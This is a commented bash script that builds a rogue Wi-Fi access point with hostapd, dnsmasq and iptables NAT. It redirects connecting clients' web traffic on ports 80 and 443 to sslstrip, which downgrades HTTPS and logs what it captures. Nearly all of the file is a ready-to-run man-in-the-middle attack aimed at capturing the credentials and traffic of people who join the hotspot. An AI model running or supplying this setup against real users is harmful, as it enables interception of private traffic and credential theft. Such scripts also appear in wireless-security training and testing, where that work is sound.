#!/bin/bash

# PHY == the network card used to create our access point
phy=wlan0

# upstream == the network card that serves as our interface to the network
# gateway.  To build our NAT, we route packets between PHY and upstream.
upstream=eth0

# Set bssid to mac addess... really this could be set to any valid bssid.
bssid="$(macchanger -s wlan0  | tail -n1 |  awk '{ print $3 }')"

# set the essid to the first command line argument
essid="$1"

# set the essid to the second command line argument
channel="$2"

echo "[*] Starting hotspot script..."
echo "[*] Using configs:"

echo "[*] --> essid: 			$essid"
echo "[*] --> bssid: 			$bssid"
echo "[*] --> channel: 			$channel"
echo "[*] --> AP interface: 		$phy"
echo "[*] --> upstream interface: 	$upstream"

# Mercilessly destroy interfering processes. There is a more elegent
# way to do this using nmcli, but ain't nobody got time for that shit. ;)

echo "[*] Stopping NetworkManager..."
systemctl stop network-manager
sleep 3

# Stopping network-manager will push a soft block on our wireless interfaces.
# We need to undo that.
echo "[*] Removing soft block on wireless interfaces..."
rfkill unblock wlan

# Stopping network-manager will also disable all of our network interfaces.
# Let's reenable them.
echo "[*] Reenabling $phy interface"
ifconfig $phy up

# Next we create a hostapd config file. We start by giving hostapd
# an interface with which to create an access point.
echo "[*] Creating hostapd config file...."
echo "interface=$phy" > hostapd.conf

# Next we specify our ESSID, BSSID, and channel information.
echo "ssid=$essid" >> hostapd.conf
echo "bssid=$bssid" >> hostapd.conf
echo "channel=$channel" >> hostapd.conf

# Finally, set the hardware mode to g for compatibility with our
# TP-Link cards.
echo "hw_mode=g" >> hostapd.conf

# Now that we have a config file, start hostapd as a background process.
echo "[*] Starting hostapd"
hostapd ./hostapd.conf &
sleep 7

echo "[*] AP started, using IP 10.0.0.1, network 10.0.0.0/24"
# Give our new AP an IP address and subnet mask
ifconfig $phy 10.0.0.1 netmask 255.255.255.0

# Update routing table to allow rogue AP to serve as default gateway
# of its subnet
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

# Next we create our dnsmasq. Remember we're only using dnsmasq as
# a DHCP server at this time.

echo "[*] Creating dnsmasq config file..."
# The first line in our config defines a DHCP pool of 10.0.0.80 through
# 10.0.0.254, with a DHCP lease 6 hours.
echo "dhcp-range=10.0.0.80,10.0.0.254,6h" > dnsmasq.conf

# The next line tells dnsmasq to issue a DHCP option that instructs
# new members of the 10.0.0.0/24 network to use Google (8.8.8.8) as
# a DNS server.
echo "dhcp-option=6,8.8.8.8" >> dnsmasq.conf

# Next, we add a line that tells dnsmasq to issue a DHCP option that
# instructs new member of 10.0.0.0/24 to use our rogue AP as a gateway.
echo "dhcp-option=3,10.0.0.1" >> dnsmasq.conf

# The next two lines tell dnsmasq to act as an authoritative DHCP server
# and to log DHCP queries. 
echo "dhcp-authoritative" >> dnsmasq.conf
echo "log-queries" >> dnsmasq.conf


# Finally we start dnsmasq, telling it to use our config file. By default,
# dnsmasq binds to the wildcard address. Since we don't want dnsmasq to do
# this, we keep it from doing so using the -z flag. Additionally, we use
# the -i flag to force dnsmasq to only listen on our $Phy interface.
# We use the -I flag to explicity forbid dnsmasq from running on our
# local interface. 

echo "[*] Starting dnsmasq as DHCP server... DNS set to 8.8.8.8"
dnsmasq -z -p 0 -C ./dnsmasq.conf -i "$phy" -I lo

# We enable packet forwarding by interacing with the /proc file system.
echo "[*] Enabling packet forwarding"
echo '1' > /proc/sys/net/ipv4/ip_forward

echo "[*] Performing iptables magic"

# We set a policy for the INPUT, FORWARD, and OUTPUT chains to accept
# all by default.
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT

# We then flush all tables to give ourselves a clean slate.
iptables --flush
iptables --table nat --flush


# Next we append a rule to the POSTROUTING chain of iptables. Changes
# made to the POSTROUTING chain are not visible to the Linux kernel since
# the chain is applied to every packet before it leaves the system. The rule
# chain that we append to is called MASQUERADE. When applied to a packet,
# the MASQUERADE chain sets the source IP address to the outbound NIC's
# external IP address. This effectively creates an NAT.

# To summarize, we tell iptables to change the source IP address of each packet
# to that of eth0 and to send each packet to eth0 after this modification
# occurs.
iptables --table nat --append POSTROUTING -o $upstream --jump MASQUERADE
iptables --append FORWARD -i $phy -o $upstream --jump ACCEPT

iptables --table nat --append PREROUTING --protocol tcp --destination-port 80 --jump REDIRECT --to-port 10000
iptables --table nat --append PREROUTING --protocol tcp --destination-port 443 --jump REDIRECT --to-port 10000

iptables --table nat --append POSTROUTING --jump MASQUERADE

# remove this line if problems and see what happens
#iptables --table nat --append PREROUTING --protocol tcp --destination-port 443 --jump REDIRECT --to-port 10000

sslstrip -l 10000 -p -w ./sslstrip.log

read -p 'Hotspot ready. Press enter to quit...'

# kill the daemon processes that we started earlier
echo "[*] Killing daemons"
killall dnsmasq
killall hostapd
sleep 5

# We set a policy for the INPUT, FORWARD, and OUTPUT chains to accept
# all by default.
echo "[*] Restoring iptables"
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT

# We then flush all tables to give ourselves a clean slate.
iptables --flush
iptables --table nat --flush
